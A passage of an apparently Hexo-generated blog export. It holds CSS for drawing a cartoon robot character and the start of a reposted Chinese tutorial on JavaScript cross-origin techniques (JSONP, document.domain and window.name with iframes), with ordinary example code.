class="line">	position:absolute;</span><br><span class="line">	z-index:20;</span><br><span class="line">&#125;</span><br><span class="line">.whi_right&#123;</span><br><span class="line">	top:165px;</span><br><span class="line">	left:210px;	</span><br><span class="line">&#125;	</span><br><span class="line"></span><br><span class="line">.whi_right_top&#123;</span><br><span class="line">	top:145px;</span><br><span class="line">	left:210px;</span><br><span class="line">&#125;	</span><br><span class="line"></span><br><span class="line">.whi_right_bottom&#123;</span><br><span class="line">	top:185px;</span><br><span class="line">	left:210px;</span><br><span class="line">&#125;	</span><br><span class="line"></span><br><span class="line">.whi_left&#123;</span><br><span class="line">	top:165px;</span><br><span class="line">	left:50px;	</span><br><span class="line">&#125;	</span><br><span class="line">.whi_left_top&#123;</span><br><span class="line">	top:145px;</span><br><span class="line">	left:50px;</span><br><span class="line">&#125;	</span><br><span class="line"></span><br><span class="line">.whi_left_bottom&#123;</span><br><span class="line">	top:185px;</span><br><span class="line">	left:50px;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.rotate20&#123;</span><br><span class="line">	transform: rotate(20deg);</span><br><span class="line">		-webkit-transform: rotate(20deg);</span><br><span class="line">		-moz-transform: rotate(20deg);</span><br><span class="line">		-o-transform: rotate(20deg);</span><br><span class="line">		-ms-transform: rotate(20deg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.rotate160&#123;</span><br><span class="line">	transform: rotate(160deg);</span><br><span class="line">		-webkit-transform: rotate(160deg);</span><br><span class="line">		-moz-transform: rotate(160deg);</span><br><span class="line">		-o-transform: rotate(160deg);</span><br><span class="line">		-ms-transform: rotate(160deg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#choker&#123;</span><br><span class="line">	position:relative;</span><br><span class="line">	top:-55px;</span><br><span class="line">	left:35px;</span><br><span class="line">	z-index:100;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#belt&#123;</span><br><span class="line">	width:230px;</span><br><span class="line">	height:20px;</span><br><span class="line">	border:#000 solid 2px;</span><br><span class="line">	background:#ca4100;</span><br><span class="line">	background: linear-gradient(top, #ca4100, #800400); </span><br><span class="line">		background: -webkit-linear-gradient(top, #ca4100, #800400); </span><br><span class="line">		background: -moz-linear-gradient(top, #ca4100, #800400); </span><br><span class="line">		background: -o-linear-gradient(top, #ca4100, #800400); </span><br><span class="line">		background: -ms-linear-gradient(top, #ca4100, #800400); </span><br><span class="line">	border-radius:10px;	</span><br><span class="line">		-webkit-border-radius:10px;	</span><br><span class="line">		-moz-border-radius:10px;</span><br><span class="line">		position:relative;</span><br><span class="line">	left:5px;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#bell&#123;</span><br><span class="line">	width:40px;</span><br><span class="line">	height:40px;</span><br><span class="line">	border-radius:50px;</span><br><span class="line">		-webkit-border-radius:50px;</span><br><span class="line">		-moz-border-radius:50px;</span><br><span class="line">	border:2px solid #000;</span><br><span class="line">	background:#f9f12a;</span><br><span class="line">	background: linear-gradient(top, #f9f12a, #e9e11a 75%,#a9a100); </span><br><span class="line">		background: -webkit-linear-gradient(top, #f9f12a, #e9e11a 75%,#a9a100); </span><br><span class="line">		background: -moz-linear-gradient(top, #f9f12a, #e9e11a 75%,#a9a100); </span><br><span class="line">		background: -o-linear-gradient(top, #f9f12a, #e9e11a 75%,#a9a100); </span><br><span class="line">		background: -ms-linear-gradient(top, #f9f12a, #e9e11a 75%,#a9a100); </span><br><span class="line">	box-shadow:-5px 5px 10px rgba(0,0,0,0.25);</span><br><span class="line">		-webkit-box-shadow:-5px 3px 5px rgba(0,0,0,0.25);</span><br><span class="line">		-moz-box-shadow:-5px 5px 10px rgba(0,0,0,0.25);</span><br><span class="line">	position:relative;</span><br><span class="line">	top:-15px;</span><br><span class="line">	left:100px;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#bell_line&#123;</span><br><span class="line">	width:36px;</span><br><span class="line">	height:2px;</span><br><span class="line">	background:#f9f12a;</span><br><span class="line">	border:#333 solid 2px;</span><br><span class="line">	position:relative;</span><br><span class="line">	top:10px;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#bell_circle&#123;</span><br><span class="line">	width:12px;</span><br><span class="line">	height:10px;</span><br><span class="line">	border-radius:5px;</span><br><span class="line">		-webkit-border-radius:5px;</span><br><span class="line">		-moz-border-radius:5px;</span><br><span class="line">	background:#000;</span><br><span class="line">	position:relative;</span><br><span class="line">	top:14px;</span><br><span class="line">	left:14px;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#bell_under&#123;</span><br><span class="line">	width:3px;</span><br><span class="line">	height:15px;</span><br><span class="line">	background:#000;</span><br><span class="line">	position:relative;</span><br><span class="line">	top:10px;</span><br><span class="line">	left:18px;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#bell_light&#123;</span><br><span class="line">	width:10px;</span><br><span class="line">	height:10px;</span><br><span class="line">	border-radius:10px;</span><br><span class="line">		-webkit-border-radius:10px;</span><br><span class="line">		-moz-border-radius:10px;</span><br><span class="line">	box-shadow:19px 8px 5px #fff;</span><br><span class="line">		-webkit-box-shadow:19px 8px 5px #fff;</span><br><span class="line">		-moz-box-shadow:19px 8px 5px #fff;</span><br><span class="line">	position:relative;</span><br><span class="line">	opacity:0.7;</span><br><span class="line">	top:-35px;</span><br><span class="line">	left:5px;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#doutai&#123;</span><br><span class="line">	position:absolute;</span><br><span class="line">	width:220px;</span><br><span class="line">	height:165px;</span><br><span class="line">	background:#07beea;</span><br><span class="line">	background: linear-gradient(right, #07beea, #0073b3 50%,#0096be 75%,#00b0e0 ,#0096be 100% ,#333 114%); </span><br><span class="line">		background: -webkit-linear-gradient(right, #07beea, #0073b3 50%,#0096be 75%,#00b0e0 ,#0096be 100% ,#333 114%); </span><br><span class="line">		background: -moz-linear-gradient(right, #07beea, #0073b3 50%,#0096be 75%,#00b0e0 ,#0096be 100% ,#333 114%); </span><br><span class="line">		background: -o-linear-gradient(right, #07beea, #0073b3 50%,#0096be 75%,#00b0e0 ,#0096be 100% ,#333 114%); </span><br><span class="line">		background: -ms-linear-gradient(right, #07beea, #0073b3 50%,#0096be 75%,#00b0e0 ,#0096be 100% ,#333 114%); </span><br><span class="line">	border:#333 2px solid;</span><br><span class="line">	top:262px;</span><br><span class="line">	left:46px;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">div.base_white2&#123;</span><br><span class="line">	position:absolute;</span><br><span class="line">	width:170px;</span><br><span class="line">	height:170px;</span><br><span class="line">	border-radius:85px;</span><br><span class="line">		-webkit-border-radius:85px;</span><br><span class="line">		-moz-border-radius:85px;</span><br><span class="line">	border:2px solid #000;</span><br><span class="line">	background:#FFF;</span><br><span class="line">	background: linear-gradient(right top, #fff,#fff 75%, #eee 83%,#999 90%,#444 95%, #000); </span><br><span class="line">		background: -webkit-linear-gradient(right top, #fff,#fff 75%, #eee 83%,#999 90%,#444 95%, #000); </span><br><span class="line">		background: -moz-linear-gradient(right top, #fff,#fff 75%, #eee 83%,#999 90%,#444 95%, #000); </span><br><span class="line">		background: -o-linear-gradient(right top, #fff,#fff 75%, #eee 83%,#999 90%,#444 95%, #000); </span><br><span class="line">		background: -ms-linear-gradient(right top, #fff,#fff 75%, #eee 83%,#999 90%,#444 95%, #000); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.doutai_center&#123;</span><br><span class="line">	top:230px;</span><br><span class="line">	left:72px;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#circle&#123;</span><br><span class="line">	position:relative;</span><br><span class="line">	width:130px;</span><br><span class="line">	height:130px;</span><br><span class="line">	border-radius:65px;</span><br><span class="line">		-webkit-border-radius:65px;</span><br><span class="line">		-moz-border-radius:65px;</span><br><span class="line">	background:#fff;</span><br><span class="line">	background: linear-gradient(right top, #fff, #fff 70%,#f8f8f8 75%,#eee 80%,#ddd 88% , #fff); </span><br><span class="line">		background: -webkit-linear-gradient(right top, #fff, #fff 70%,#f8f8f8 75%,#eee 80%,#ddd 88% , #fff); </span><br><span class="line">		background: -moz-linear-gradient(right top, #fff, #fff 70%,#f8f8f8 75%,#eee 80%,#ddd 88% , #fff); </span><br><span class="line">		background: -o-linear-gradient(right top, #fff, #fff 70%,#f8f8f8 75%,#eee 80%,#ddd 88% , #fff); </span><br><span class="line">		background: -ms-linear-gradient(right top, #fff, #fff 70%,#f8f8f8 75%,#eee 80%,#ddd 88% , #fff);  </span><br><span class="line">	border:2px solid #000;</span><br><span class="line">	top:-120px;</span><br><span class="line">	left:92px;</span><br><span class="line">&#125;</span><br><span class="line">#circle_rewrite&#123;</span><br><span class="line">	position:relative;</span><br><span class="line">	width:134px;</span><br><span class="line">	height:60px;</span><br><span class="line">	background:#fff;	</span><br><span class="line">	border-bottom:2px solid #000;</span><br><span class="line">	top:-250px;</span><br><span class="line">	left:92px;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#hand_right&#123;</span><br><span class="line">	position:absolute;</span><br><span class="line">	top:272px;</span><br><span class="line">	left:248px;</span><br><span class="line">	width:100px;</span><br><span class="line">	height:100px;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#arm_right&#123;</span><br><span class="line">	position:relative;</span><br><span class="line">	width:80px;</span><br><span class="line">	height:50px;</span><br><span class="line">	background:#07beea;</span><br><span class="line">	background: linear-gradient(top, #07beea, #07beea 85%, #555); </span><br><span class="line">		background: -webkit-linear-gradient(top, #07beea, #07beea 85%, #555); </span><br><span class="line">		background: -moz-linear-gradient(top, #07beea, #07beea 85%, #555); </span><br><span class="line">		background: -o-linear-gradient(top, #07beea, #07beea 85%, #555); </span><br><span class="line">		background: -ms-linear-gradient(top, #07beea, #07beea 85%, #555); </span><br><span class="line">	border:solid 1px #000;</span><br><span class="line">	z-index:-1;</span><br><span class="line">	top:17px;</span><br><span class="line">	transform: rotate(35deg);</span><br><span class="line">		-webkit-transform: rotate(35deg);</span><br><span class="line">		-moz-transform: rotate(35deg);</span><br><span class="line">		-o-transform: rotate(35deg);</span><br><span class="line">		-ms-transform: rotate(35deg);</span><br><span class="line">	box-shadow:-10px 7px 10px rgba(0,0,0,0.35);</span><br><span class="line">		-webkit-box-shadow:-10px 7px 10px rgba(0,0,0,0.35);</span><br><span class="line">		-moz-box-shadow:-10px 7px 10px rgba(0,0,0,0.35);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#hand_left&#123;</span><br><span class="line">	position:absolute;</span><br><span class="line">	top:272px;</span><br><span class="line">	left:-46px;</span><br><span class="line">	width:100px;</span><br><span class="line">	height:100px;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#arm_left&#123;</span><br><span class="line">	position:relative;</span><br><span class="line">	width:80px;</span><br><span class="line">	height:50px;</span><br><span class="line">	background:#07beea;</span><br><span class="line">	background: linear-gradient(top left, #0096be, #0096be 55%, #07beea); </span><br><span class="line">		background: -webkit-linear-gradient(top left, #0096be, #0096be 55%, #07beea); </span><br><span class="line">		background: -moz-linear-gradient(top left, #0096be, #0096be 55%, #07beea); </span><br><span class="line">		background: -o-linear-gradient(top left, #0096be, #0096be 55%, #07beea); </span><br><span class="line">		background: -ms-linear-gradient(top left, #0096be, #0096be 55%, #07beea); </span><br><span class="line">	border:solid 1px #000;</span><br><span class="line">	z-index:-1;</span><br><span class="line">	top:17px;</span><br><span class="line">	left:36px;</span><br><span class="line">	transform: rotate(145deg);</span><br><span class="line">		-webkit-transform: rotate(145deg);</span><br><span class="line">		-moz-transform: rotate(145deg);</span><br><span class="line">		-o-transform: rotate(145deg);</span><br><span class="line">		-ms-transform: rotate(145deg);</span><br><span class="line">	box-shadow:5px -7px 10px rgba(0,0,0,0.25);</span><br><span class="line">		-webkit-box-shadow:5px -7px 10px rgba(0,0,0,0.25);</span><br><span class="line">		-moz-box-shadow:5px -7px 10px rgba(0,0,0,0.25);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">div.hand_circle&#123;</span><br><span class="line">	position:absolute;</span><br><span class="line">	width:60px;</span><br><span class="line">	height:60px;</span><br><span class="line">	border-radius:30px;</span><br><span class="line">		-webkit-border-radius:30px;</span><br><span class="line">		-moz-border-radius:30px;</span><br><span class="line">	border:2px solid #000;</span><br><span class="line">	background:#fff;</span><br><span class="line">	background: linear-gradient(right top, #fff, #fff 50%, #eee 70%, #ddd 80%,#999); </span><br><span class="line">		background: -webkit-linear-gradient(right top, #fff, #fff 50%, #eee 70%, #ddd 80%,#999); </span><br><span class="line">		background: -moz-linear-gradient(right top, #fff, #fff 50%, #eee 70%, #ddd 80%,#999); </span><br><span class="line">		background: -o-linear-gradient(right top, #fff, #fff 50%, #eee 70%, #ddd 80%,#999); </span><br><span class="line">		background: -ms-linear-gradient(right top, #fff, #fff 50%, #eee 70%, #ddd 80%,#999); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.hand_right&#123;</span><br><span class="line">	top:32px;</span><br><span class="line">	left:40px;	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.arm_rewrite_right&#123;</span><br><span class="line">	position:relative;</span><br><span class="line">	width:4px;</span><br><span class="line">	height:45px;</span><br><span class="line">	background:#07beea;</span><br><span class="line">	top:-51px;</span><br><span class="line">	left:18px;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.hand_left&#123;</span><br><span class="line">	top:34px;</span><br><span class="line">	left:10px;	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.arm_rewrite_left&#123;</span><br><span class="line">	position:relative;</span><br><span class="line">	width:4px;</span><br><span class="line">	height:50px;</span><br><span class="line">	background:#07beea;</span><br><span class="line">	background: linear-gradient(top left, #0096be, #0096be); </span><br><span class="line">		background: -webkit-linear-gradient(top left, #0096be, #0096be); </span><br><span class="line">		background: -moz-linear-gradient(top left, #0096be, #0096be); </span><br><span class="line">		background: -o-linear-gradient(top left, #0096be, #0096be); </span><br><span class="line">		background: -ms-linear-gradient(top left, #0096be, #0096be); </span><br><span class="line">	top:-52px;</span><br><span class="line">	left:92px;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#foot&#123;</span><br><span class="line">	position:relative;</span><br><span class="line">	width:280px;</span><br><span class="line">	height:40px;</span><br><span class="line">	top:-141px;</span><br><span class="line">	left:20px;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#foot_left&#123;</span><br><span class="line">	width:125px;</span><br><span class="line">	height:30px;</span><br><span class="line">	background:#fff;</span><br><span class="line">	background: linear-gradient(right top, #fff,#fff 75%, #eee 85%, #999); </span><br><span class="line">		background: -webkit-linear-gradient(right top, #fff,#fff 75%, #eee 85%, #999); </span><br><span class="line">		background: -moz-linear-gradient(right top, #fff,#fff 75%, #eee 85%, #999); </span><br><span class="line">		background: -o-linear-gradient(right top, #fff,#fff 75%, #eee 85%, #999); </span><br><span class="line">		background: -ms-linear-gradient(right top, #fff,#fff 75%, #eee 85%, #999); </span><br><span class="line">	border:solid 2px #333;</span><br><span class="line">	border-top-left-radius:80px;</span><br><span class="line">	border-bottom-left-radius:40px;</span><br><span class="line">	border-top-right-radius:60px;</span><br><span class="line">	border-bottom-right-radius:60px;</span><br><span class="line">		-webkit-border-top-left-radius:80px;</span><br><span class="line">		-webkit-border-bottom-left-radius:40px;</span><br><span class="line">		-webkit-border-top-right-radius:60px;</span><br><span class="line">		-webkit-border-bottom-right-radius:60px;</span><br><span class="line">		-moz-border-radius-topleft:80px;</span><br><span class="line">		-moz-border-radius-bottomleft:40px;</span><br><span class="line">		-moz-border-radius-topright:60px;</span><br><span class="line">		-moz-border-radius-bottomright:60px;</span><br><span class="line">	position:relative;</span><br><span class="line">	left:8px;</span><br><span class="line">	top:2px;</span><br><span class="line">	box-shadow:-6px 0px 10px rgba(0,0,0,0.35);</span><br><span class="line">		-webkit-box-shadow:-6px 0px 10px rgba(0,0,0,0.35);</span><br><span class="line">		-moz-box-shadow:-6px 0px 10px rgba(0,0,0,0.35);</span><br><span class="line">	z-index:-1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#foot_right&#123;</span><br><span class="line">	position:relative;</span><br><span class="line">	width:125px;</span><br><span class="line">	height:30px;</span><br><span class="line">	background:#fff;</span><br><span class="line">	background: linear-gradient(right top, #fff,#fff 75%, #eee 85%, #999); </span><br><span class="line">		background: -webkit-linear-gradient(right top, #fff,#fff 75%, #eee 85%, #999); </span><br><span class="line">		background: -moz-linear-gradient(right top, #fff,#fff 75%, #eee 85%, #999); </span><br><span class="line">		background: -o-linear-gradient(right top, #fff,#fff 75%, #eee 85%, #999); </span><br><span class="line">		background: -ms-linear-gradient(right top, #fff,#fff 75%, #eee 85%, #999); </span><br><span class="line">	border:solid 2px #333;</span><br><span class="line">	border-top-left-radius:60px;</span><br><span class="line">	border-bottom-left-radius:60px;</span><br><span class="line">	border-top-right-radius:80px;</span><br><span class="line">	border-bottom-right-radius:40px;</span><br><span class="line">		-webkit-border-top-left-radius:60px;</span><br><span class="line">		-webkit-border-bottom-left-radius:60px;</span><br><span class="line">		-webkit-border-top-right-radius:80px;</span><br><span class="line">		-webkit-border-bottom-right-radius:40px;</span><br><span class="line">		-moz-border-radius-topleft:60px;</span><br><span class="line">		-moz-border-radius-bottomleft:60px;</span><br><span class="line">		-moz-border-radius-topright:80px;</span><br><span class="line">		-moz-border-radius-bottomright:40px;</span><br><span class="line">	top:-32px;</span><br><span class="line">	left:141px;</span><br><span class="line">	box-shadow:-6px 0px 10px rgba(0,0,0,0.35);</span><br><span class="line">		-webkit-box-shadow:-6px 0px 10px rgba(0,0,0,0.35);</span><br><span class="line">		-moz-box-shadow:-6px 0px 10px rgba(0,0,0,0.35);</span><br><span class="line">	z-index:-1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#foot_rewrite&#123;</span><br><span class="line">	position:relative;</span><br><span class="line">	width:20px;</span><br><span class="line">	height:10px;</span><br><span class="line">	background:#fff;</span><br><span class="line">	background: linear-gradient(right top, #666, #fff 83%, #fff); </span><br><span class="line">		background: -webkit-linear-gradient(right top, #666, #fff 83%, #fff); </span><br><span class="line">		background: -moz-linear-gradient(right top, #666, #fff 83%, #fff); </span><br><span class="line">		background: -o-linear-gradient(right top, #666, #fff 83%, #fff); </span><br><span class="line">		background: -ms-linear-gradient(right top, #666, #fff 83%, #fff); </span><br><span class="line">	top:-76px;</span><br><span class="line">	left:127px;</span><br><span class="line">	border-top:2px solid #000;</span><br><span class="line">	border-right:2px solid #000;</span><br><span class="line">	border-left:2px solid #000;</span><br><span class="line">	border-top-right-radius:40px;</span><br><span class="line">	border-top-left-radius:40px;</span><br><span class="line">		-webkit-border-top-right-radius:40px;</span><br><span class="line">		-webkit-border-top-left-radius:40px;</span><br><span class="line">		-moz-border-radius-topleft:40px;</span><br><span class="line">		-moz-border-radius-topright:40px;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#shadow_doutai_left&#123;</span><br><span class="line">	width:30px;</span><br><span class="line">	height:200px;</span><br><span class="line">	box-shadow:-10px 10px 15px rgba(0,0,0,0.45);</span><br><span class="line">		-webkit-box-shadow:-10px 10px 15px rgba(0,0,0,0.45);</span><br><span class="line">		-moz-box-shadow:-10px 10px 15px rgba(0,0,0,0.45);</span><br><span class="line">	position:absolute;</span><br><span class="line">	top:250px;</span><br><span class="line">	left:46px;</span><br><span class="line">	z-index:-10;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#shadow_doutai_right&#123;</span><br><span class="line">	width:30px;</span><br><span class="line">	height:200px;</span><br><span class="line">	box-shadow:10px 10px 15px rgba(0,0,0,0.35);</span><br><span class="line">		-webkit-box-shadow:10px 10px 25px rgba(0,0,0,0.35);</span><br><span class="line">		-moz-box-shadow:10px 10px 15px rgba(0,0,0,0.35);</span><br><span class="line">	position:absolute;</span><br><span class="line">	top:240px;</span><br><span class="line">	left:230px;</span><br><span class="line">	z-index:-10;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#shadow_doutai_arm&#123;</span><br><span class="line">	width:85px;</span><br><span class="line">	height:165px;</span><br><span class="line">	box-shadow:-100px 10px 15px rgba(0,0,0,0.0);</span><br><span class="line">		-webkit-box-shadow:-100px 10px 15px rgba(0,0,0,0.25);</span><br><span class="line">		-moz-box-shadow:-100px 10px 15px rgba(0,0,0,0.25);</span><br><span class="line">	position:absolute;</span><br><span class="line">	top:230px;</span><br><span class="line">	left:113px;</span><br><span class="line">	z-index:10;</span><br><span class="line">	opacity:0.5;</span><br><span class="line">	transform: rotate(-20deg);</span><br><span class="line">		-webkit-transform: rotate(-20deg);</span><br><span class="line">		-moz-transform: rotate(-20deg);</span><br><span class="line">		-o-transform: rotate(-20deg);</span><br><span class="line">		ms-transform: rotate(-20deg);</span><br><span class="line">	border-bottom-left-radius:40px;</span><br><span class="line">		-webkit-border-bottom-left-radius:40px;</span><br><span class="line">		-moz-border-radius-bottomleft:40px;</span><br><span class="line">	border-top-left-radius:20px;</span><br><span class="line">		-webkit-border-top-left-radius:20px;</span><br><span class="line">		-moz-border-radius-topleft:20px;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#shadow_belt&#123;</span><br><span class="line">	width:40px;</span><br><span class="line">	height:30px;</span><br><span class="line">	box-shadow:-100px 10px 15px rgba(0,0,0,0);</span><br><span class="line">		-webkit-box-shadow:-100px 10px 15px rgba(0,0,0,0.25);</span><br><span class="line">		-moz-box-shadow:-100px 10px 15px rgba(0,0,0,0.25);</span><br><span class="line">	position:absolute;</span><br><span class="line">	top:240px;</span><br><span class="line">	left:130px;</span><br><span class="line">	z-index:10;</span><br><span class="line">	border-bottom-left-radius:40px;</span><br><span class="line">		-webkit-border-bottom-left-radius:40px;</span><br><span class="line">		-moz-border-radius-bottomleft:40px;</span><br><span class="line">	z-index:300;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#arm_left:not(\*|*), .arm_rewrite_left:not(\*|*)&#123;</span><br><span class="line">	background:#07beea;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#arm_left, .arm_rewrite_left&#123;</span><br><span class="line">	background:#07beea\9;</span><br><span class="line">	*background:#07beea;</span><br><span class="line">	_background:#07beea;</span><br><span class="line">&#125;</span><br><span class="line">.arm_rewrite_left&#123;</span><br><span class="line">		background: -ms-linear-gradient(top left, #0096be, #0096be);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#arm_left&#123;</span><br><span class="line">		background: -ms-linear-gradient(top left, #0096be, #0096be 55%, #07beea);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#kiji&#123;</span><br><span class="line">	position:relative;</span><br><span class="line">	top:-150px;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#footer&#123;</span><br><span class="line">	width:97%;</span><br><span class="line">	padding:0 0 0 30px;</span><br><span class="line">	border-bottom:#333 1px solid;</span><br><span class="line">	margin:-150px 0 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#footer a,a:link&#123;</span><br><span class="line">	color:#09C;</span><br><span class="line">	position:relative;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>JS跨域及解决方案</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/JS%E8%B7%A8%E5%9F%9F%E5%8F%8A%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</url>
    <content><![CDATA[<p>&lt;转&gt;<a href="https://www.imooc.com/article/21976">详解跨域(最全的解决方案)</a></p>
<ol>
<li>什么是跨域<br>跨域，是指浏览器不能执行其他网站的脚本。它是由浏览器的同源策略造成的，是浏览器对JavaScript实施的安全限制。</li>
</ol>
<p>同源策略限制了一下行为：</p>
<p>Cookie、LocalStorage 和 IndexDB 无法读取<br>DOM 和 JS 对象无法获取<br>Ajax请求发送不出去<br>2. 常见的跨域场景<br>所谓的同源是指，域名、协议、端口均为相同。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//www.nealyang.cn/index.html 调用   http://www.nealyang.cn/server.php  非跨域</span></span><br><span class="line"></span><br><span class="line">http:<span class="comment">//www.nealyang.cn/index.html 调用   http://www.neal.cn/server.php  跨域,主域不同</span></span><br><span class="line"></span><br><span class="line">http:<span class="comment">//abc.nealyang.cn/index.html 调用   http://def.neal.cn/server.php  跨域,子域名不同</span></span><br><span class="line"></span><br><span class="line">http:<span class="comment">//www.nealyang.cn:8080/index.html 调用   http://www.nealyang.cn/server.php  跨域,端口不同</span></span><br><span class="line"></span><br><span class="line">https:<span class="comment">//www.nealyang.cn/index.html 调用   http://www.nealyang.cn/server.php  跨域,协议不同</span></span><br><span class="line"></span><br><span class="line">localhost   调用 <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> 跨域</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>跨域的解决办法</li>
<li>1 jsonp跨域<br>jsonp跨域其实也是JavaScript设计模式中的一种代理模式。在html页面中通过相应的标签从不同域名下加载静态资源文件是被浏览器允许的，所以我们可以通过这个“犯罪漏洞”来进行跨域。一般，我们可以动态的创建script标签，再去请求一个带参网址来实现跨域通信</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;原生的实现方式</span><br><span class="line">let script &#x3D; document.createElement(&#39;script&#39;);</span><br><span class="line"></span><br><span class="line">script.src &#x3D; &#39;http:&#x2F;&#x2F;www.nealyang.cn&#x2F;login?username&#x3D;Nealyang&amp;callback&#x3D;callback&#39;;</span><br><span class="line"></span><br><span class="line">document.body.appendChild(script);</span><br><span class="line"></span><br><span class="line">function callback(res) &#123;</span><br><span class="line">  console.log(res);</span><br><span class="line">&#125;</span><br><span class="line">&#96;&#96;&#96;&#96;</span><br><span class="line"></span><br><span class="line">当然，jquery也支持jsonp的实现方式</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>$.ajax({<br>    url:’<a href="http://www.nealyang.cn/login&#39;">http://www.nealyang.cn/login&#39;</a>,<br>    type:’GET’,<br>    dataType:’jsonp’,//请求方式为jsonp<br>    jsonpCallback:’callback’,<br>    data:{<br>        “username”:”Nealyang”<br>    }<br>})</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">虽然这种方式非常好用，但是一个最大的缺陷是，只能够实现get请求</span><br><span class="line"></span><br><span class="line">3.2 document.domain + iframe 跨域</span><br><span class="line">这种跨域的方式最主要的是要求主域名相同。什么是主域名相同呢？</span><br><span class="line">www.geekjc.com aaa.geekjc.com ba.ad.geekjc.com 这三个主域名都是geekjc.com,而主域名不同的就不能用此方法。</span><br><span class="line"></span><br><span class="line">假设目前a.geekjc.com 和 b.geekjc.com 分别对应指向不同ip的服务器。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>a.geekjc.com 下有一个test.html文件</p>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>html</title>
    <script type="text/javascript" src = "jquery-1.12.1.js"></script>
</head>
<body>
    <div>A页面</div>
    <iframe 
    style = "display : none" 
    name = "iframe1" 
    id = "iframe" 
    src="http://b.geekjc.com/1.html" frameborder="0"></iframe>
    <script type="text/javascript">
        $(function(){
            try{
                document.domain = "geekjc.com"
            }catch(e){}
            $("#iframe").load(function(){
                var jq = document.getElementById('iframe').contentWindow.$
                jq.get("http://geekjc.com/test.json",function(data){
                    console.log(data);
                });
            })
        })
    </script>
</body>
</html>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">利用 iframe 加载 其他域下的文件（geekjc.com&#x2F;1.html）, 同时 document.domain 设置成 geekjc.com ，当 iframe 加载完毕后就可以获取 geekjc.com 域下的全局对象， 此时尝试着去请求 geekjc.com 域名下的 test.json （此时可以请求接口），就会发现数据请求失败了~~ 惊不惊喜，意不意外！！！！！！！</span><br><span class="line"></span><br><span class="line">数据请求失败，目的没有达到，自然是还少一步：</span><br></pre></td></tr></table></figure>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>html</title>
    <script type="text/javascript" src = "jquery-1.12.1.js"></script>
    <script type="text/javascript">
        $(function(){
            try{
                document.domain = "geekjc.com"
            }catch(e){}
        })
    </script>
</head>
<body>
    <div id = "div1">B页面</div>
</body>
</html>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">此时在进行刷新浏览器，就会发现数据这次真的是成功了~</span><br><span class="line"></span><br><span class="line">3.3 window.name + iframe 跨域</span><br><span class="line">window.name属性可设置或者返回存放窗口名称的一个字符串。他的神器之处在于name值在不同页面或者不同域下加载后依旧存在，没有修改就不会发生变化，并且可以存储非常长的name(2MB)</span><br><span class="line"></span><br><span class="line">假设index页面请求远端服务器上的数据，我们在该页面下创建iframe标签，该iframe的src指向服务器文件的地址（iframe标签src可以跨域），服务器文件里设置好window.name的值，然后再在index.html里面读取改iframe中的window.name的值。完美~</span><br></pre></td></tr></table></figure>
<body>
  <script type="text/javascript"> 
    iframe = document.createElement('iframe'),
    iframe.src = 'http://localhost:8080/data.php';
    document.body.appendChild(iframe);
    iframe.onload = function() {
      console.log(iframe.contentWindow.name)
    };
  </script>
</body>
